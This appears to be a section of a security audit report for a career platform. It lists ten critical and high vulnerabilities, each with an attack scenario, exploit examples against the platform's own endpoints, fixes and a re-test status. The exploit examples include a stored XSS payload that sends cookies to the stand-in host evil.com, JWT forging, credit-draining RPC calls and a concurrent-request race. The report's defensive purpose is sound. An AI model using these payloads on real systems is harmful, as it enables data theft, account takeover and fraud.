# 🔴 Part 7: Critical & High Severity Vulnerabilities

**Last Tested & Verified:** September 6, 2026 *(Platform Version 1.2.0, Commit `e051d84`)*  
**Previous Audit:** May 24, 2026  

Each finding includes: severity, attack scenario, impact, exploit example, exact fix, production mitigation, and **current re-test status as of September 6, 2026**.

---

## VULN-001 — 🔴 CRITICAL: Exposed Secrets in `.env` File

**Severity:** CRITICAL  
**Category:** Secret Management  
**File:** `backend/app/.env`  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN IN GIT HISTORY**  
*While `.env` is absent from the current git index (`git ls-files`), historical commits `3573790e` and `92114948` permanently contain all production secrets. Key rotation and git history purging with BFG are required.*


### Attack Scenario
An attacker gains access to the `.env` file through: git history leak, CI/CD artifact exposure, developer machine compromise, backup file left on server, or any scenario where the file is accessible.

### Impact
**TOTAL PLATFORM COMPROMISE.** The file contains:
- `SUPABASE_SERVICE_ROLE` — Full admin access to every table, bypasses all RLS
- `SUPABASE_JWT_SECRET` — Can forge ANY user's JWT, impersonate any account
- `GROQ_API_KEY`, `OPENROUTER_API_KEY`, `HUGGINGFACE_API_KEY` — Bill attacker's AI usage to you
- `REDIS_URL` with password — Access/modify all rate limit state and interview sessions
- `SENTRY_DSN` — Flood your error monitoring, hide real attacks

### Exploit Example
```bash
# With SUPABASE_SERVICE_ROLE, attacker can read ALL user data:
curl -X GET "https://uniwhigyvfbgkkgiiwgi.supabase.co/rest/v1/profiles?select=*" \
  -H "apikey: <SERVICE_ROLE_KEY>" \
  -H "Authorization: Bearer <SERVICE_ROLE_KEY>"

# Forge a JWT for any user (with JWT_SECRET):
import jwt
forged = jwt.encode({"sub": "victim-uuid", "role": "authenticated", "exp": 9999999999},
                    "<JWT_SECRET>", algorithm="HS256")

# Grant themselves unlimited credits:
curl -X POST "https://uniwhigyvfbgkkgiiwgi.supabase.co/rest/v1/rpc/grant_credits" \
  -H "apikey: <SERVICE_ROLE_KEY>" \
  -d '{"p_user_id": "attacker-uuid", "p_amount": 999999}'
```

### Fix
```bash
# 1. IMMEDIATELY rotate ALL keys listed in .env
# 2. Move secrets to environment-only injection:
#    - Render: Dashboard → Environment Variables
#    - Vercel: Project Settings → Environment Variables
# 3. Delete .env from disk on deployment servers
# 4. Verify .env was NEVER committed:
git log --all --full-history -- backend/app/.env
git log --all --full-history -- '*.env'
# 5. If ever committed, use BFG Repo Cleaner to purge from history
```

### Production Mitigation
- Use Render/Vercel environment variables exclusively
- Add pre-commit hook to prevent `.env` commits
- Implement secret scanning in CI (e.g., `gitleaks`, `trufflehog`)
- Rotate ALL keys on a quarterly schedule

---

## VULN-002 — 🔴 CRITICAL: `deduct_credits` RPC Callable by Authenticated Users

**Severity:** CRITICAL  
**Category:** Broken Access Control / Privilege Escalation  
**File:** `supabase/migrations/20260513000000_credit_system.sql` (line 215) and `20260523000000_comprehensive_fix.sql` (lines 9-12)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*Verified in migration `20260523000000_comprehensive_fix.sql`: `GRANT EXECUTE ON FUNCTION public.deduct_credits ... TO authenticated` remains active, allowing authenticated clients to execute credit deduction/grant RPCs directly.*


### Attack Scenario
The migration grants `EXECUTE ON FUNCTION public.deduct_credits TO authenticated`. Any authenticated user can call this RPC directly via the Supabase client (using the anon key + their JWT), bypassing the FastAPI backend entirely.

### Impact
- User can call `deduct_credits` with **negative amounts** to grant themselves infinite credits
- User can call `deduct_credits` targeting **other users' UUIDs** to drain their credits
- Bypasses all rate limiting (RPC called directly, not through FastAPI)

### Exploit Example
```javascript
// From browser console (user is logged in with their JWT):
const { createClient } = supabase;
const client = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Drain another user's credits:
await client.rpc('deduct_credits', {
  p_user_id: 'victim-uuid-here',
  p_feature: 'exploit',
  p_amount: 9999
});

// Or grant self credits with negative amount (if no check exists):
await client.rpc('grant_credits', {
  p_user_id: 'my-uuid',
  p_amount: 10000,
  p_feature: 'exploit'
});
```

### Fix
```sql
-- REVOKE direct execution from authenticated users
REVOKE EXECUTE ON FUNCTION public.deduct_credits FROM authenticated;
REVOKE EXECUTE ON FUNCTION public.grant_credits FROM authenticated;
REVOKE EXECUTE ON FUNCTION public.admin_set_unlimited FROM authenticated;

-- These functions should ONLY be callable by service_role (from the backend)
-- The SECURITY DEFINER already runs them as the function owner, but
-- authenticated users should not be able to invoke them at all.
```

Also add a validation check inside the function:
```sql
-- Inside deduct_credits, add at the top:
IF p_amount <= 0 THEN
  RAISE EXCEPTION 'invalid_amount: amount must be positive';
END IF;

-- Inside grant_credits, add:
IF p_amount <= 0 OR p_amount > 10000 THEN
  RAISE EXCEPTION 'invalid_amount: amount must be between 1 and 10000';
END IF;
```

### Production Mitigation
- Revoke all RPC permissions from `authenticated` role
- Add input validation inside PostgreSQL functions
- Add rate limiting on RPC calls at the database level
- Monitor `credit_transactions` for anomalous patterns

---

## VULN-003 — 🔴 CRITICAL: Service Role Used for ALL Database Operations

**Severity:** CRITICAL  
**Category:** Broken Access Control / RLS Bypass  
**File:** `backend/app/db/supabase.py` (line 13-16)  
**Re-Test Status (September 6, 2026):** ℹ️ **MITIGATED IN APPLICATION LAYER**  
*The backend continues to query Supabase via `SUPABASE_SERVICE_ROLE`. While this bypasses Postgres RLS, application code rigorously validates user ownership on individual queries (`.eq("user_id", user.id)`), except for the minor gap in `/analysis/history`.*


### Attack Scenario
Every single database query in the application uses the service role client, which **bypasses all Row Level Security policies**. RLS policies exist on `profiles`, `resumes`, `ai_analyses`, `credit_transactions`, and `ip_credit_claims` — but none of them are active for any query the backend makes.

This means:
- A single bug in any endpoint's `user_id` filter → full data leak
- If any new endpoint forgets `.eq("user_id", ...)` → instant IDOR
- No defense-in-depth — application logic is the ONLY access control layer

### Impact
All data isolation relies on the developer remembering to add `user_id` filters. One missed filter = cross-tenant data leak.

### Exploit Example
The existing bug in `GET /analysis/history/{resume_id}` (line 208) demonstrates this:
```python
# CURRENT CODE (vulnerable):
history_res = await supabase.table("ai_analyses").select("*") \
    .eq("resume_id", resume_id).order("created_at", desc=True).execute()
# ↑ No user_id filter! Service role returns ALL matching rows regardless of owner.
```

If an attacker discovers a valid `resume_id` (e.g., via UUID enumeration or API response), they could potentially see analyses belonging to other users.

### Fix
**Short-term (do now):**
```python
# Add user_id filter to EVERY query:
history_res = await supabase.table("ai_analyses").select("*") \
    .eq("resume_id", resume_id) \
    .eq("user_id", str(user.id)) \  # ← ADD THIS
    .order("created_at", desc=True).execute()
```

**Long-term (do before scaling):**
```python
# Create a user-scoped client that sets the JWT so RLS is active:
async def get_user_db(user_jwt: str) -> AsyncClient:
    client = await create_async_client(settings.SUPABASE_URL, settings.SUPABASE_ANON_KEY)
    client.auth.set_session(user_jwt)  # RLS now active
    return client

# Keep service_role client ONLY for: admin endpoints, triggers, system operations
```

### Production Mitigation
- Audit every endpoint for missing `user_id` filters
- Add integration tests that verify cross-user isolation
- Consider switching to anon+JWT client for user-scoped operations
- Add database-level audit logging for service role queries

---

## VULN-004 — 🔴 CRITICAL: Stored XSS via `full_name` Field

**Severity:** CRITICAL  
**Category:** Cross-Site Scripting (Stored XSS)  
**File:** `backend/app/api/v1/endpoints/auth.py` (line 31)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN (P0)**  
*Re-tested against `auth.py:31`: `UserAuth.full_name: str | None = None` has no validator or tag-stripping regex. Submitting HTML/JS payloads during signup successfully accepts the raw string.*


### Attack Scenario
The `full_name` field in signup has NO sanitization. An attacker registers with `full_name = "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"`. This is stored in `profiles.full_name` and rendered wherever names appear (admin panel, user lists, any future user-facing profile display).

### Impact
- **Cookie theft** — steal admin's session cookies
- **Account takeover** — if admin panel renders names without escaping
- **Keylogging** — inject scripts that capture admin keystrokes
- **Phishing** — render fake login forms inside the admin panel

### Exploit Example
```bash
curl -X POST https://api.kareerist.com/api/v1/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Attack3r!",
    "full_name": "<img src=x onerror=\"fetch('"'"'https://evil.com/steal?c='"'"'+document.cookie)\">"
  }'
# Response: {"msg":"User created successfully","user_id":"..."}
# The XSS payload is now stored in profiles.full_name
```

### Fix
```python
# In auth.py UserAuth schema, add:
@field_validator("full_name", mode="before")
@classmethod
def sanitize_name(cls, v: str | None) -> str | None:
    if v is None:
        return v
    import re
    # Strip ALL HTML tags
    v = re.sub(r'<[^>]+>', '', v)
    # Strip dangerous characters
    v = re.sub(r'[<>"\';&]', '', v)
    # Limit length
    return v[:100].strip()
```

Additionally, ensure React frontend uses text rendering (not `dangerouslySetInnerHTML`) for all user-provided fields.

---

## VULN-005 — 🟠 HIGH: Race Condition in Daily Credit Grant (TOCTOU)

**Severity:** HIGH  
**Category:** Race Condition / Business Logic  
**File:** `backend/app/services/credits.py` (lines 270-374)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*Code review of `credits.py`: Grant still executes via RPC before the insert record in `daily_credit_grants`. Without a database-level `UNIQUE(user_id, grant_date)` constraint, concurrent bursts can result in duplicate grants.*


### Attack Scenario
The `grant_daily_credits` function has a Time-of-Check-to-Time-of-Use (TOCTOU) race condition:

1. Check if already granted today (step 4, line 327-330)
2. Double-check via `daily_credit_grants` table (step 5, line 333-337)
3. Grant credits via RPC (step 6, line 347)
4. Record the grant (step 7, line 355)

An attacker sends 50 simultaneous requests to `/api/v1/auth/me` or `/api/v1/credits/daily-grant`. All 50 pass the check in step 4 (none see the grant yet), all 50 pass step 5, and all 50 execute step 6 — granting 50 × 50 = 2,500 credits instead of 50.

### Impact
- Unlimited credit farming — attacker gets 50× credits per day
- Economic damage — free users consume expensive AI API calls

### Exploit Example
```bash
# Send 50 concurrent requests:
for i in $(seq 1 50); do
  curl -X POST https://api.kareerist.com/api/v1/credits/daily-grant \
    -H "Cookie: __krs_sid=<valid_token>" \
    -H "X-CSRF-Token: <valid_csrf>" &
done
wait
# Result: Multiple daily grants credited instead of just one
```

### Fix
```sql
-- Add a UNIQUE constraint on (user_id, grant_date) in daily_credit_grants:
ALTER TABLE public.daily_credit_grants
  ADD CONSTRAINT uq_daily_credit_grant_per_user_per_day
  UNIQUE (user_id, grant_date);
```

```python
# In grant_daily_credits, wrap the insert in a try/except for unique violation:
try:
    await supabase.table("daily_credit_grants").insert({
        "user_id": user_id,
        "grant_date": today_utc,
        "amount": DAILY_CREDIT_GRANT,
    }).execute()
except Exception as e:
    if "duplicate" in str(e).lower() or "unique" in str(e).lower():
        return {"granted": False, "amount": 0, "already_granted_today": True, "not_eligible": False}
    raise

# Only grant credits AFTER the insert succeeds (swap steps 6 and 7)
```

---

## VULN-006 — 🟠 HIGH: OAuth Error Leaks Internal Exception Details

**Severity:** HIGH  
**Category:** Information Disclosure  
**File:** `backend/app/api/v1/endpoints/auth.py` (line 166)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*Code check in `auth.py:166`: `raise HTTPException(status_code=401, detail=f"Invalid or expired OAuth code: {str(e)}")` continues to leak internal exception details.*


### Attack Scenario
When OAuth code exchange fails, the raw Python exception is returned to the client:
```python
raise HTTPException(status_code=401, detail=f"Invalid or expired OAuth code: {str(e)}")
```

This can leak: internal URLs, Supabase API responses, stack trace fragments, configuration details.

### Impact
- Attackers learn internal service topology
- Error messages may reveal library versions, API endpoints, or auth flow details
- Aids in crafting more targeted attacks

### Exploit Example
```bash
# Send an intentionally malformed OAuth exchange:
curl -X POST https://api.kareerist.com/api/v1/auth/oauth/session \
  -H "Content-Type: application/json" \
  -d '{"code": "AAAA", "code_verifier": "BBBBBBBB"}'
# Response may include:
# {"detail": "Invalid or expired OAuth code: AuthApiError('invalid_grant: Invalid code verifier'...)"}
# ↑ Leaks Supabase auth error internals
```

### Fix
```python
except Exception as e:
    logger.error("[OAuth] Code exchange failed: %s (type: %s)", str(e), type(e).__name__)
    raise HTTPException(status_code=401, detail="OAuth authentication failed. Please try again.")
```

---

## VULN-007 — 🟠 HIGH: No Signed URLs for Storage Access

**Severity:** HIGH  
**Category:** Insecure Direct Storage Access  
**File:** `backend/app/api/v1/endpoints/resumes.py`, `cover_letter.py`  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*Direct storage URLs are generated without time-limited signatures. Protection relies entirely on Supabase storage bucket policies.*


### Attack Scenario
Resume and cover letter PDFs are stored in Supabase Storage at predictable paths: `{user_id}/{timestamp}_{filename}`. The storage bucket policy determines who can read these files. If the bucket is set to "public" or has overly permissive policies, any file URL is accessible without authentication.

### Impact
- Resume PDFs containing PII (name, phone, address, work history) exposed
- Cover letters with company-specific information leaked
- GDPR/privacy regulation violations

### Exploit Example
```bash
# If bucket is public or policy is permissive:
# Attacker guesses/enumerates storage paths:
curl "https://uniwhigyvfbgkkgiiwgi.supabase.co/storage/v1/object/public/Resumes/{user_id}/1716000000_resume.pdf"
# If user_id is known (from any API response), all their files are accessible
```

### Fix
```python
# Generate signed URLs with expiration instead of returning raw paths:
async def get_signed_resume_url(file_path: str, expires_in: int = 300) -> str:
    supabase = await get_db()
    result = await supabase.storage.from_("Resumes").create_signed_url(
        path=file_path,
        expires_in=expires_in  # 5 minutes
    )
    return result["signedURL"]

# In resume GET endpoint, return signed URL instead of raw path:
@router.get("/{resume_id}/download")
async def download_resume(resume_id: str, user: CurrentUser):
    # ... ownership check ...
    signed_url = await get_signed_resume_url(resume.file_url)
    return {"download_url": signed_url}
```

Also ensure the Supabase Storage bucket policy is set to **private** (no public access).

---

## VULN-008 — 🟠 HIGH: Admin Authorization is Application-Layer Only

**Severity:** HIGH  
**Category:** Privilege Escalation  
**File:** `backend/app/api/v1/endpoints/admin.py` (lines 18-34)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*The backend strictly enforces `_require_admin()` in `admin.py`, but database-level protection against `is_admin` escalation depends on Postgres RLS update column restrictions.*


### Attack Scenario
Admin check reads `is_admin` from `profiles` table using the service role client. Since the service role bypasses RLS, and `profiles` has an update policy for authenticated users (`profiles_update_own`), a user could potentially update their own `is_admin` field if the update policy doesn't restrict which columns can be modified.

### Impact
- Any authenticated user could escalate to admin
- Admin can: view all users, grant credits, set unlimited status
- Full platform control

### Exploit Example
```javascript
// From browser, user updates their own profile:
const { data, error } = await supabase
  .from('profiles')
  .update({ is_admin: true })
  .eq('id', myUserId);
// If the RLS update policy doesn't restrict column-level access, this succeeds
```

### Fix
```sql
-- Option 1: Add column-level restriction to the update policy
DROP POLICY IF EXISTS "profiles_update_own" ON public.profiles;
CREATE POLICY "profiles_update_own"
  ON public.profiles
  FOR UPDATE
  TO authenticated
  USING (id = auth.uid())
  WITH CHECK (
    id = auth.uid()
    AND is_admin = (SELECT is_admin FROM public.profiles WHERE id = auth.uid())
    AND is_unlimited = (SELECT is_unlimited FROM public.profiles WHERE id = auth.uid())
    AND remaining_credits = (SELECT remaining_credits FROM public.profiles WHERE id = auth.uid())
    AND total_credits_granted = (SELECT total_credits_granted FROM public.profiles WHERE id = auth.uid())
  );

-- Option 2 (simpler): Only allow updating safe columns via a function
CREATE OR REPLACE FUNCTION public.update_profile_safe(
  p_full_name TEXT DEFAULT NULL,
  p_avatar_url TEXT DEFAULT NULL
)
RETURNS VOID
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  UPDATE public.profiles
    SET full_name = COALESCE(p_full_name, full_name),
        avatar_url = COALESCE(p_avatar_url, avatar_url),
        updated_at = NOW()
    WHERE id = auth.uid();
END;
$$;

-- Revoke direct UPDATE on profiles from authenticated:
REVOKE UPDATE ON public.profiles FROM authenticated;
```

---

## VULN-009 — 🟠 HIGH: Temporary File Write in Voice Upload (Path Traversal + Cleanup)

**Severity:** HIGH  
**Category:** Path Traversal / Insecure File Handling  
**File:** `backend/app/api/v1/endpoints/interview.py` (lines 289-308)  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*Voice upload in `interview.py` still extracts file extensions directly from uploaded filename without whitelist validation and writes to standard temporary files.*


### Attack Scenario
The voice upload endpoint writes audio to a temporary file using the uploaded filename's extension:
```python
suffix = os.path.splitext(audio.filename or "answer.webm")[1] or ".webm"
```
An attacker can send a filename like `../../etc/cron.d/evil.sh` — while `NamedTemporaryFile` uses its own path, the suffix extraction from user input is a code smell that could become exploitable if the code changes.

Additionally, if the server crashes between file write and the `finally` cleanup, temp files accumulate.

### Impact
- Disk exhaustion via repeated large uploads
- Potential path traversal if code is refactored
- Shared `/tmp` on container platforms can leak data between processes

### Fix
```python
# Sanitize suffix to only allow known audio extensions:
ALLOWED_AUDIO_EXTENSIONS = {".webm", ".wav", ".mp4", ".ogg", ".m4a"}
raw_suffix = os.path.splitext(audio.filename or "answer.webm")[1].lower()
suffix = raw_suffix if raw_suffix in ALLOWED_AUDIO_EXTENSIONS else ".webm"

# Use a dedicated temp directory inside the workspace:
import tempfile
TEMP_DIR = Path(__file__).parent.parent.parent / "tmp_audio"
TEMP_DIR.mkdir(exist_ok=True)

with tempfile.NamedTemporaryFile(delete=False, suffix=suffix, dir=str(TEMP_DIR)) as tmp:
    tmp.write(audio_bytes)
    tmp_path = tmp.name
```

---

## VULN-010 — 🟠 HIGH: Missing Frontend Security Headers on Vercel

**Severity:** HIGH  
**Category:** Missing Security Headers  
**File:** `FRONTEND/vercel.json`  
**Re-Test Status (September 6, 2026):** ⚠️ **STILL OPEN**  
*`FRONTEND/vercel.json` contains only SPA rewrite routes (`"source": "/(.*)", "destination": "/index.html"`) and no security headers.*


### Attack Scenario
The Vercel deployment configuration only has rewrite rules — no security headers. The backend adds headers for its own responses, but the frontend (served by Vercel) has NO security headers at all.

### Impact
- No CSP on the frontend → XSS payloads execute freely
- No X-Frame-Options → clickjacking attacks possible
- No HSTS → downgrade attacks on first visit

### Fix
```json
{
  "rewrites": [
    { "source": "/(.*)", "destination": "/index.html" }
  ],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(self), geolocation=()" },
        { "key": "X-XSS-Protection", "value": "1; mode=block" },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.supabase.co; connect-src 'self' https://*.supabase.co https://api.kareerist.com; frame-ancestors 'none'"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        }
      ]
    }
  ]
}
```
